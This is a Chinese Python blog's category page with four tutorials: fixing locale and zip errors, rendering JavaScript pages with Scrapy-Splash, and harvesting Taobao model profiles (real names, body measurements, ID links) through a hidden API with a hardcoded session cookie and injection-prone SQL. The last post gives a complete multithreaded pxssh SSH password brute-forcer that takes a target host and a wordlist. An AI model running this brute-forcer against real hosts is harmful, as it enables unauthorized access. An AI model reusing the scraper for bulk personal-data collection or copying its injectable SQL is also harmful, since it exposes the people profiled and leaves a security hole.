				<time datetime="2018-04-23T11:35:12+08:00" itemprop="datePublished">2018/4/23</time>
			</div>
			<div class="tags">posted in 
			
			    <a class='category' href='python.html'>Python</a>&nbsp;
			 
			</div>
		</div>
		<h1 class="title" itemprop="name"><a href="15244545128606.html" itemprop="url">
		Python 错误集锦</a></h1>
		<div class="entry-content" itemprop="articleBody">
			
			<ol>
<li><p>ValueError: unknown locale: UTF-8 <br/>
<img src="https://pic.mylonly.com/2018-04-23-15244561735556.jpg" alt=""/></p>

<p>添加下面代码至用户目录的.bash_profile文件   </p>

<pre><code class="language-Bash">export LANG=&quot;en_US.UTF-8&quot;
export LC_COLLATE=&quot;en_US.UTF-8&quot;
export LC_CTYPE=&quot;en_US.UTF-8&quot;
export LC_MESSAGES=&quot;en_US.UTF-8&quot;
export LC_MONETARY=&quot;en_US.UTF-8&quot;
export LC_NUMERIC=&quot;en_US.UTF-8&quot;
export LC_TIME=&quot;en_US.UTF-8&quot;
export LC_ALL=
</code></pre></li>
<li><p>zip()函数在Python2和Python3中的区别</p>

<p>在Python2中，zip返回的是元祖的列表<br/>
而在Python3中，zip返回的是元祖组成的迭代器，得套个list函数才能将其转换为列表</p>

<pre><code>x = [1, 2, 3]
y = [a, b, c]

#python3
n = list(zip(x,y))
print(n)
#python2
n = zip(x,y)
print n
</code></pre></li>
</ol>


			
			
		</div>

	</article>
 
	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
		<div class="meta">
			<div class="date">
				<time datetime="2017-09-12T15:07:09+08:00" itemprop="datePublished">2017/9/12</time>
			</div>
			<div class="tags">posted in 
			
			    <a class='category' href='python.html'>Python</a>&nbsp;
			 
			</div>
		</div>
		<h1 class="title" itemprop="name"><a href="15052000291680.html" itemprop="url">
		利用Scrapy-Splash抓取JS动态渲染的网页数据</a></h1>
		<div class="entry-content" itemprop="articleBody">
			
			<p>随着越来越多的网站开始用JS在客户端浏览器动态渲染网站，导致很多我们需要的数据并不能由原始的html中获取，再加上Scrapy本身并不提供JS渲染解析的功能，通常对这类网站数据的爬取我们一般采用两种方法：</p>

<ol>
<li>通过分析网站，找到对应数据的接口，模拟接口去获取我们需要的数据(参见<a href="https://www.mylonly.com/14945011244738.html">Scrapy抓取Ajax动态页面</a>),但是一旦该网站的接口隐藏的很深，或者接口的加密过于复杂，此种方法可能就有点行不通了</li>
<li>借助JS内核，将获取到的含有JS脚本的页面交由JS内核去渲染，最后将渲染后生成的html返回给Scrapy分析，比较常见的WebKit和Scrapy-Splash</li>
</ol>

<p>本篇文章的目的就是用来介绍如何使用Scrapy-Splash来配合Scrapy抓取动态页面这个问题。</p>

<h3 id="toc_0">准备工作</h3>

<ol>
<li><p>Docker安装,具体安装步骤参考<a href="https://docs.docker.com/engine/installation/">Docker官网</a></p>

<blockquote>
<p>为什么要安装Docker?<br/>
因为Scrapy-Splash使用了<code>Splash HTTP API</code>,所以你需要提供一个Splash实例，而在Docker镜像中已经有现成的Splash实例了，可以很方便的使用。</p>
</blockquote></li>
<li><p>Docker镜像源更改,参考<a href="https://ieevee.com/tech/2016/09/28/docker-mirror.html">国内 docker 仓库镜像对比</a></p></li>
<li><p>安装运行Splash</p>

<pre><code>docker pull scrapinghub/splash   #从docker镜像中拉取splash实例
docker run -p 8050:8050 scrapinghub/splash  #启动splash实例
</code></pre></li>
</ol>

<h3 id="toc_1">Scrapy配置</h3>

<p>在Scrapy项目的setting.py中加入如下内容：</p>

<pre><code class="language-Python">SPLASH_URL = &#39;http://localhost:8050&#39;  

DOWNLOADER_MIDDLEWARES = {
&#39;scrapy_splash.SplashCookiesMiddleware&#39;: 723,
&#39;scrapy_splash.SplashMiddleware&#39;: 725,
&#39;scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware&#39;: 810,
}

SPIDER_MIDDLEWARES = {
&#39;scrapy_splash.SplashDeduplicateArgsMiddleware&#39;: 100,
}

DUPEFILTER_CLASS = &#39;scrapy_splash.SplashAwareDupeFilter&#39;

HTTPCACHE_STORAGE = &#39;scrapy_splash.SplashAwareFSCacheStorage&#39;

</code></pre>

<h3 id="toc_2">实际代码解析</h3>

<p>我们以<a href="http://stock.qq.com/l/stock/ywq/list20150423143546.htm">腾讯证券</a>这个页面为例，腾讯的证券新闻列表是js动态渲染而成</p>

<p>我们直接打开这个链接，然后打开开发者工具，定位到新闻列表处:<br/>
<img src="https://pic.mylonly.com/2017-09-12-074653.jpg" alt=""/></p>

<p>我们在从network中查看第一次请求的Response时发现，返回的html中该列表页处是空的<br/><br/>
<img src="https://pic.mylonly.com/2017-09-12-075028.jpg" alt=""/></p>

<p>实际的数据被藏着JS里，加载完成后由JS操作DOM插入完成<br/>
<img src="https://pic.mylonly.com/2017-09-12-075305.jpg" alt=""/></p>

<p>此处由于实际数据被塞到了一段JS的变量里面，并不是由Ajax调用接口获取的，因此为了避免自己手动去截取js变量，我们便将该页面交给Scrapy-Splash渲染</p>

<pre><code class="language-Python">import scrapy
from FinancialInfoSpider.items import ArticleItem
from scrapy_splash import SplashRequest
from w3lib.html import remove_tags
import re
from bs4 import BeautifulSoup

class TencentStockSpider(scrapy.Spider):
    name = &quot;TencentStock&quot;
    def start_requests(self):
        urls = [
           &#39;http://stock.qq.com/l/stock/ywq/list20150423143546.htm&#39;,
        ]

        for url in urls:
            yield SplashRequest(url, self.parse, args={&#39;wait&#39;: 0.5})

    def parse(self,response):

        sel = scrapy.Selector(response)
        links = sel.xpath(&quot;//div[@class=&#39;qq_main&#39;]//ul[@class=&#39;listInfo&#39;]//li//div[@class=&#39;info&#39;]//h3//a/@href&quot;).extract()
        requests = []
        
        for link in links:
            request = scrapy.Request(link, callback =self.parse_article)
            requests.append(request)
        return requests

    def parse_article(self,response):

        sel = scrapy.Selector(response)

        article = ArticleItem()
        article[&#39;title&#39;] = sel.xpath(&#39;//*[@id=&quot;Main-Article-QQ&quot;]/div/div[1]/div[1]/div[1]/h1/text()&#39;).extract()[0]
        article[&#39;source&#39;] = sel.xpath(&#39;//*[@id=&quot;Main-Article-QQ&quot;]/div/div[1]/div[1]/div[1]/div/div[1]/span[2]&#39;).xpath(&#39;string(.)&#39;).extract()[0]
        article[&#39;pub_time&#39;] = sel.xpath(&#39;//*[@id=&quot;Main-Article-QQ&quot;]/div/div[1]/div[1]/div[1]/div/div[1]/span[3]/text()&#39;).extract()[0]
        
        html_content = sel.xpath(&#39;//*[@id=&quot;Cnt-Main-Article-QQ&quot;]&#39;).extract()[0]
        article[&#39;content&#39;] = self.remove_html_tags(html_content)
        return article


    def remove_html_tags(self,html):
        
        soup = BeautifulSoup(html)
        [s.extract() for s in soup(&#39;script&#39;)]
        [s.extract() for s in soup(&#39;style&#39;)] 
         
        content = &#39;&#39;
        for substring in soup.stripped_strings:
            content = content + substring

        return content       
</code></pre>

<p>主要代码就一句，将获取到的页面发送给本地的Splash实例去渲染解析，最后将结果返回给parse函数解析</p>

<pre><code>SplashRequest(url, self.parse, args={&#39;wait&#39;: 0.5})
</code></pre>

<p>里面用了BeautifulSoup这个库去除了html中得script和style标签，具体用法可以参考这两篇文章:</p>

<p><a href="http://cuiqingcai.com/1319.html">Python爬虫利器二之Beautiful Soup的用法</a><br/>
<a href="https://my.oschina.net/letiantian/blog/504669">使用BeautifulSoup删除html中的script、注释</a></p>

<p>输出结果:</p>

<p><img src="https://pic.mylonly.com/2017-09-12-080930.jpg" alt=""/></p>


			
			
		</div>

	</article>
 
	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
		<div class="meta">
			<div class="date">
				<time datetime="2016-07-04T19:12:04+08:00" itemprop="datePublished">2016/7/4</time>
			</div>
			<div class="tags">posted in 
			
			    <a class='category' href='python.html'>Python</a>&nbsp;
			 
			</div>
		</div>
		<h1 class="title" itemprop="name"><a href="14945011244738.html" itemprop="url">
		Scrapy抓取Ajax动态页面</a></h1>
		<div class="entry-content" itemprop="articleBody">
			
			<blockquote>
<p>一般来说爬虫类框架抓取Ajax动态页面都是通过一些第三方的webkit库去手动执行html页面中的js代码， 最后将生产的html代码交给spider分析。本篇文章则是通过浏览器提供的Debug工具分析Ajax页面的具体请求内容，找到获取数据的接口url，直接调用该接口获取数据，省去了引入python-webkit库的麻烦，而且由于一般ajax请求的数据都是结构化数据，这样更省去了我们利用xpath解析html的痛苦。</p>
</blockquote>

<p>这次我们要抓取的网站是<a href="https://mm.taobao.com">淘女郎</a>的页面,全站都是通过Ajax获取数据然后重新渲染生产的。</p>

<p>这篇文章的代码已上传至我的<a href="https://github.com/mylonly/Spiders">Github</a>,由于后面有部分内容并没有提供完整代码，所以贴上地址供各位参考。</p>

<h3 id="toc_0">分析工作</h3>

<p>用Chrome打开淘女郎的首页中的<a href="https://mm.taobao.com/search_tstar_model.htm">美人库</a>，这个页面毫无疑问是会展示所有的模特的信息，同时打开Debug工具，在network选项中查看浏览器发送了哪些请求？</p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:11:01.jpg" alt="2016-07-04_16:11:01.jpg"/></p>

<p>在截图的左下角可以看到总共产生了86个请求，那么有什么办法可以快速定位到Ajax请求的链接了，利用Network当中提供的Filter功能，选中Filter，最后选择右边的XHR过滤(XHR时XMLHttpRequest对象，一般Ajax请求的数据都是结构化数据)，这样就剩下了为数不多的几个请求，剩下的就靠我们自己一个一个的检查吧</p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:22:18.jpg" alt="2016-07-04_16:22:18.jpg"/></p>

<p>很幸运，通过分析每个接口返回的request和response信息，发现最后一个请求就是我们需要的接口url</p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:25:56.jpg" alt="2016-07-04_16:25:56.jpg"/></p>

<p>Request中得参数很简单,根据英文意思就可以猜出意义,由于我们要抓取所有模特的信息，所以不需要定制这些参数，后面直接将这些参数post给接口就行了</p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:29:06.jpg" alt="2016-07-04_16:29:06.jpg"/></p>

<p>在Response中可以获得到的有用数据有两个:所有模特信息的列表<code>searchDOList</code>、以及总页数<code>totolPage</code></p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:35:05.jpg" alt="2016-07-04_16:35:05.jpg"/></p>

<p>searchDOList列表中得对象都有如上图所示的json格式，它也正是我们需要的模特信息的数据</p>

<h3 id="toc_1">Scrapy编码</h3>

<ol>
<li><p>定义Item</p>

<pre><code class="language-Python">class tbModelItem(scrapy.Item):
    avatarUrl = scrapy.Field()
    cardUrl = scrapy.Field()
    city = scrapy.Field()
    height = scrapy.Field()
    identityUrl = scrapy.Field()
    modelUrl = scrapy.Field()
    realName = scrapy.Field()
    totalFanNum = scrapy.Field()
    totalFavorNum = scrapy.Field()
    userId = scrapy.Field()
    viewFlag = scrapy.Field()
    weight = scrapy.Field()
</code></pre>

<p>根据上面的分析得到的json格式，我们可以很轻松的定义出item</p></li>
<li><p>Spider编写</p>

<pre><code class="language-Python">import urllib2
import os
import re
import codecs
import json
import sys
from scrapy import Spider
from scrapy.selector import Selector
from MySpider.items import tbModelItem,tbThumbItem
from scrapy.http import Request
from scrapy.http import FormRequest
from scrapy.utils.response import open_in_browser

reload(sys)
sys.setdefaultencoding(&#39;utf8&#39;)

class tbmmSpider(Spider):
    name = &quot;tbmm&quot;
    allow_domians = [&quot;mm.taobao.com&quot;]

    custom_settings = {
        &quot;DEFAULT_REQUEST_HEADERS&quot;:{
            &#39;authority&#39;:&#39;mm.taobao.com&#39;,
            &#39;accept&#39;:&#39;application/json, text/javascript, */*; q=0.01&#39;,
            &#39;accept-encoding&#39;:&#39;gzip, deflate&#39;,
            &#39;accept-language&#39;:&#39;zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4&#39;,
            &#39;origin&#39;:&#39;https://mm.taobao.com&#39;,
            &#39;referer&#39;:&#39;https://mm.taobao.com/search_tstar_model.htm?spm=719.1001036.1998606017.2.KDdsmP&#39;,
            &#39;user-agent&#39;:&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36&#39;,
            &#39;x-requested-with&#39;:&#39;XMLHttpRequest&#39;,
            &#39;cookie&#39;:&#39;cna=/oN/DGwUYmYCATFN+mKOnP/h; tracknick=adimtxg; _cc_=Vq8l%2BKCLiw%3D%3D; tg=0; thw=cn; v=0; cookie2=1b2b42f305311a91800c25231d60f65b; t=1d8c593caba8306c5833e5c8c2815f29; _tb_token_=7e6377338dee7; CNZZDATA30064598=cnzz_eid%3D1220334357-1464871305-https%253A%252F%252Fmm.taobao.com%252F%26ntime%3D1464871305; CNZZDATA30063600=cnzz_eid%3D1139262023-1464874171-https%253A%252F%252Fmm.taobao.com%252F%26ntime%3D1464874171; JSESSIONID=8D5A3266F7A73C643C652F9F2DE1CED8; uc1=cookie14=UoWxNejwFlzlcw%3D%3D; l=Ahoatr-5ycJM6M9x2/4hzZdp6so-pZzm; mt=ci%3D-1_0&#39;
        },
        &quot;ITEM_PIPELINES&quot;:{
            &#39;MySpider.pipelines.tbModelPipeline&#39;: 300
        }
    } 

    def start_requests(self):
        url = &quot;https://mm.taobao.com/tstar/search/tstar_model.do?_input_charset=utf-8&quot;
        requests = []
        for i in range(1,60):
            formdata = {&quot;q&quot;:&quot;&quot;,
                        &quot;viewFlag&quot;:&quot;A&quot;,
                        &quot;sortType&quot;:&quot;default&quot;,
                        &quot;searchStyle&quot;:&quot;&quot;,
                        &quot;searchRegion&quot;:&quot;city:&quot;,
                        &quot;searchFansNum&quot;:&quot;&quot;,
                        &quot;currentPage&quot;:str(i),
                        &quot;pageSize&quot;:&quot;100&quot;}
            request = FormRequest(url,callback=self.parse_model,formdata=formdata)
            requests.append(request)
        return requests

    def parse_model(self,response):
        jsonBody = json.loads(response.body.decode(&#39;gbk&#39;).encode(&#39;utf-8&#39;))
        models = jsonBody[&#39;data&#39;][&#39;searchDOList&#39;]
        modelItems = []
        for dict in models:
            modelItem = tbModelItem()
            modelItem[&#39;avatarUrl&#39;] = dict[&#39;avatarUrl&#39;]
            modelItem[&#39;cardUrl&#39;] = dict[&#39;cardUrl&#39;]
            modelItem[&#39;city&#39;] = dict[&#39;city&#39;]
            modelItem[&#39;height&#39;] = dict[&#39;height&#39;]
            modelItem[&#39;identityUrl&#39;] = dict[&#39;identityUrl&#39;]
            modelItem[&#39;modelUrl&#39;] = dict[&#39;modelUrl&#39;]
            modelItem[&#39;realName&#39;] = dict[&#39;realName&#39;]
            modelItem[&#39;totalFanNum&#39;] = dict[&#39;totalFanNum&#39;]
            modelItem[&#39;totalFavorNum&#39;] = dict[&#39;totalFavorNum&#39;]
            modelItem[&#39;userId&#39;] = dict[&#39;userId&#39;]
            modelItem[&#39;viewFlag&#39;] = dict[&#39;viewFlag&#39;]
            modelItem[&#39;weight&#39;] = dict[&#39;weight&#39;]
            modelItems.append(modelItem)
        return modelItems  
</code></pre>

<p>代码不长，一点一点来分析:</p>

<ol>
<li>由于分析这个页面并不需要递归遍历网页，所以就不要crawlSpider了，只继承最简单的spider</li>
<li>custome_setting可用于自定义每个spider的设置，而setting.py中的都是全局属性的，当你的scrapy工程里有多个spider的时候这个custom_setting就显得很有用了</li>
<li>ITEM_PIPELINES，自定义管道模块，当item获取到数据后会调用你指定的管道处理命令，这个后面会贴上代码，因为这个不影响本文的内容，数据的处理可以因人而异。</li>
<li>依然重写start_request,带上必要的参数请求我们分析得到的借口url，这里我省了一个懒，只遍历了前60页的数据，各位当然可以先调用1次借口确定总的页数(totalPage)之后再写这个for循环。</li>
<li>parse函数里利用json库解析了返回来得数据，赋值给item的相应字段</li>
</ol></li>
<li><p>数据后续处理</p>

<p>数据处理也就是我上面配置ITEM_PIPELINES的目的，这里，我将获取到的item数据存储到了本地的mysql数据中，各位也可以通过FEED_URL参数直接输出json格式文本文件</p>

<pre><code class="language-Python">import MySQLdb

class tbModelPipeline(object):
    def process_item(self,item,spider):
        db = MySQLdb.connect(&quot;localhost&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;spider&quot;)
        cursor = db.cursor()
        db.set_character_set(&#39;utf8&#39;)
        cursor.execute(&#39;SET NAMES utf8;&#39;)
        cursor.execute(&#39;SET CHARACTER SET utf8;&#39;)
        cursor.execute(&#39;SET character_set_connection=utf8;&#39;)

        sql =&quot;INSERT INTO tb_model(user_id,avatar_url,card_url,city,height,identity_url,model_url,real_name,total_fan_num,total_favor_num,view_flag,weight)\
                      VALUES(&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;)&quot;%(item[&#39;userId&#39;],item[&#39;avatarUrl&#39;],item[&#39;cardUrl&#39;],item[&#39;city&#39;],item[&#39;height&#39;],item[&#39;identityUrl&#39;],\
                      item[&#39;modelUrl&#39;],item[&#39;realName&#39;],item[&#39;totalFanNum&#39;],item[&#39;totalFavorNum&#39;],item[&#39;viewFlag&#39;],item[&#39;weight&#39;])
        try:
                print sql
                cursor.execute(sql)
                db.commit()
        except MySQLdb.Error,e:
                print &quot;Mysql Error %d: %s&quot; % (e.args[0], e.args[1])
        db.close()
        return item
</code></pre></li>
</ol>

<h3 id="toc_2">更重要的内容</h3>

<p>获取所有的淘女郎的基本信息并不是<a href="https://mm.taobao.com">淘女郎</a>这个网站的全部内容，还有一些更有意思的数据,比如:</p>

<p>点击进入模特的页面之后发现左侧会有有个相册选项卡，点击后右边出现了各种相册，而每个相册里面都是各种各样的模特照片</p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:04:22.jpg" alt="2016-07-04_17:04:22.jpg"/></p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:04:49.jpg" alt="2016-07-04_17:04:49.jpg"/></p>

<p>通过network的分析，这些页面的数据通通都是Ajax请求获得的，具体的接口如下:</p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:09:51.jpg" alt="2016-07-04_17:09:51.jpg"/></p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:10:16.jpg" alt="2016-07-04_17:10:16.jpg"/></p>

<ol>
<li><p>获取相册列表的接口是一个GET请求，其中只有一个很重要的user_id，而这个user_id在上面拿去模特的基本信息已经拿到了，还有个page参数用于标识获取的是第几页数据(由于这个是第一页，并没有在url中显现出来，可以通过返回的html中包含的totalPage元素获得)不过这个接口的返回就不是标准的json格式了，而是一段html，这时候又到了利用scrapy中提供的强大的xpath功能了</p>

<pre><code class="language-Python">def parse_album(self,response):
   sel = Selector(response)
   tbThumbItems = []
   thumb_url_list = sel.xpath(&quot;//div[@class=&#39;mm-photo-cell-middle&#39;]//h4//a/@href&quot;).extract()       
   thumb_name_list = sel.xpath(&quot;//div[@class=&#39;mm-photo-cell-middle&#39;]//h4//a/text()&quot;).extract()
   user_id = response.meta[&#39;user_id&#39;]
   for i in range(0,len(thumb_url_list)-1):
       thumbItem = tbThumbItem()
       thumbItem[&#39;thumb_name&#39;] = thumb_name_list[i].replace(&#39;\r\n&#39;,&#39;&#39;).replace(&#39; &#39;,&#39;&#39;)
       thumbItem[&#39;thumb_url&#39;] = thumb_url_list[i]
       thumbItem[&#39;thumb_userId&#39;] = str(user_id)
       temp = self.urldecode(thumbItem[&#39;thumb_url&#39;])
       thumbItem[&#39;thumb_id&#39;] = temp[&#39;album_id&#39;][0]
       tbThumbItems.append(thumbItem)
   return tbThumbItems
</code></pre></li>
<li><p>获取相册里照片的接口就是一个完全的json格式的接口了,其中参数包括我们已经拿到的user_id以及album_id，page的最大范围totalPage依然可以通过第一次返回的response中的totalPage字段获得</p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:25:23.jpg" alt="2016-07-04_17:25:23.jpg"/></p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:25:46.jpg" alt="2016-07-04_17:25:46.jpg"/></p></li>
</ol>

<h3 id="toc_3">总结</h3>

<ol>
<li>这种通过分析Ajax接口直接调用获取原始数据应该是效率最高的抓取数据方式，但并不是所有的Ajax页面都适用，还是要具体对待，比如我们上面获取相册列表当中就要去分析html来获得相册的基本信息。</li>
<li>获取相册和相册里的照片列表写的比较简略，基本没展示什么代码，这样写是有原因的:一个是因为我已经挂了代码的链接,而且后面这两部分的原理和我主要讲的第一部分获取模特信息的原理基本类似，不想花太多的篇幅花在这种重复的内容上，另外一个我希望想掌握Scrapy的同学能在明白我第一部分的讲解下自己能顺利完成后面的工作，遇到不明白的时候可以看看我Github上的源码，看看有什么不对的地方，只有自己写一遍才能掌握，这是编程界的硬道理。</li>
</ol>


			
			
		</div>

	</article>
 
	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
		<div class="meta">
			<div class="date">
				<time datetime="2016-06-24T19:12:26+08:00" itemprop="datePublished">2016/6/24</time>
			</div>
			<div class="tags">posted in 
			
			    <a class='category' href='python.html'>Python</a>&nbsp;
			 
			</div>
		</div>
		<h1 class="title" itemprop="name"><a href="14945011465578.html" itemprop="url">
		利用pxssh暴力破解ssh密码</a></h1>
		<div class="entry-content" itemprop="articleBody">
			
			<blockquote>
<p><mark>关于pxssh</mark><br/>
pxssh 是一个包含了pexpect库的专用脚本,它已经预先为我们写好了login(),logout()和prompt()等函数直接与SSH交互。</p>
</blockquote>

<h4 id="toc_0">利用pxssh的login函数判断密码是否正确</h4>

<p>由于pxssh.login()函数执行失败会抛出异常，因此我们可以利用try...catch来捕获相应的异常来判断密码是否正确。（PS:其中的connection_lock.release()是信号量得释放操作）</p>

<pre><code class="language-Python">def connect(host,user,password):
    try:
        session = pxssh.pxssh()
        session.login(host,user,password)
        print(&#39;[+]Password Found:&#39;+password)
    except Exception,e:
        print (&#39;[-] Error Connecting:&#39;+str(e))
    finally:
        connection_lock.release()
</code></pre>

<h4 id="toc_1">多线程和信号量</h4>

<p>由于我们准备从一个庞大的字典文件的读取密码，我们决定利用多线程来同时处理多个密码登陆操作用来加快速度。</p>

<pre><code class="language-Python">password_file = open(password,&#39;r&#39;)
for line in password_file:
        thread = threading.Thread(target=connect,args=(host,user,password))
        thread.start()
</code></pre>

<p>可是像上面的代码,如果password_file是个巨大的密码文件，就为同时产生过多的线程，很容易造成服务器无法响应，为了控制同时存在的线程数量，我们这里采用threading中的BoundedSemaphore来控制最大连接数，也就是最多的允许线程数量,讲上面的代码改成如下这样:</p>

<pre><code class="language-Python">maxConnections = 5
connection_lock = threading.BoundedSemaphore(maxConnections)
password_file = open(password,&#39;r&#39;)
for line in password_file:
   password = line.strip(&#39;\r&#39;).strip(&#39;\n&#39;)
   connection_lock.acquire()
   print(&#39;[-] Testing password:&#39;+str(password))
   thread = threading.Thread(target=connect,args=(host,user,password))
   thread.start()
</code></pre>

<p>最大连接数被设置为5，在每个thread启动时注册一个信号量，在connect函数结束时注销这个信号量，这样同时存在的线程数量就被控制为5个。</p>

<h4 id="toc_2">测试结果</h4>

<p><img src="https://pic.mylonly.com/2016-06-29_14667836697742.jpg" alt="2016-06-29_14667836697742.jpg"/><br/>
字典文件可以自己生成，或者网上找一些常用字典文件</p>

<h4 id="toc_3">完整代码</h4>

<pre><code class="language-Python">from pexpect import pxssh
import threading
import optparse
import time

maxConnections = 5
connection_lock = threading.BoundedSemaphore(maxConnections)

def send_command(child,cmd):
    child.sendline(cmd)
    child.prompt()
    print(child.before)

def connect(host,user,password):
    try:
        session = pxssh.pxssh()
        session.login(host,user,password)
        print(&#39;[+]Password Found:&#39;+password)
    except Exception,e:
        print (&#39;[-] Error Connecting:&#39;+str(e))
    finally:
        connection_lock.release()

def main():
    
    parse = optparse.OptionParser(&#39;Usage %prog &#39;+ \
        &#39;-H &lt;target host&gt; -u &lt;user&gt; -F &lt;password file&gt;&#39;)
    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify target host&#39;)
    parse.add_option(&#39;-u&#39;,dest=&#39;user&#39;,type=&#39;string&#39;,help=&#39;specify username&#39;)
    parse.add_option(&#39;-F&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify password file&#39;)
    (options,args) = parse.parse_args()

    host = options.host
    user = options.user
    password = options.password

    password_file = open(password,&#39;r&#39;)

    for line in password_file:
        password = line.strip(&#39;\r&#39;).strip(&#39;\n&#39;)
        connection_lock.acquire()
        print(&#39;[-] Testing password:&#39;+str(password))
        thread = threading.Thread(target=connect,args=(host,user,password))
        thread.start()

if __name__ == &#39;__main__&#39;:
    main()

</code></pre>


			
			
		</div>

	</article>
  

</div>
<nav id="pagenavi">
	 
	 <a class="next" href="python_1.html">Next</a> 
	<div class="center"><a href="archives.html">Blog Archives</a></div>

</nav>

</div>



        </div>
			<footer id="footer" class="inner">Copyright &copy; 2014
Powered by <a target="_blank" href="http://www.mweb.im">MWeb</a> &nbsp;&nbsp; 
Theme by <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a>
      </footer>
		</div>
	</div>

  
    



</body>
</html>